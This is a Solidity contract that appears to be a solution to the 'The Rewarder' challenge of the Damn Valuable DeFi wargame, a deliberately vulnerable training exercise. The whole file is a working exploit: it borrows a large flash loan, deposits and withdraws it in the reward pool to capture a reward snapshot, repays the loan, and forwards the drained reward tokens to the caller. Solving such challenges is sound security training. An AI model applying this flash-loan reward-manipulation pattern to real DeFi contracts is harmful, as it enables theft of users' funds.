pragma solidity ^0.6.0;

import "./../the-rewarder/FlashLoanerPool.sol";
import "./../the-rewarder/TheRewarderPool.sol";
import "./../DamnValuableToken.sol";

contract TheRewarderAttack {

    address payable owner;
    FlashLoanerPool flash;
    TheRewarderPool rewardApp;
    DamnValuableToken token;

    address rewardAppAddress;
    address flashAddress;

    constructor(address _flash, address _rewardApp, address _token) public {
        owner = msg.sender;
        rewardAppAddress = _rewardApp;
        flashAddress = _flash;
        flash = FlashLoanerPool(_flash);
        rewardApp = TheRewarderPool(_rewardApp);
        token = DamnValuableToken(_token);
    }

    function attack() public {
        flash.flashLoan(1000000 ether);
        rewardApp.rewardToken().transfer(msg.sender, rewardApp.rewardToken().balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) public returns(uint){
        token.approve(rewardAppAddress, uint(-1));
        rewardApp.deposit(_amount);
        rewardApp.withdraw(_amount);
        token.transfer(flashAddress, _amount);
    }

    receive() external payable { }
}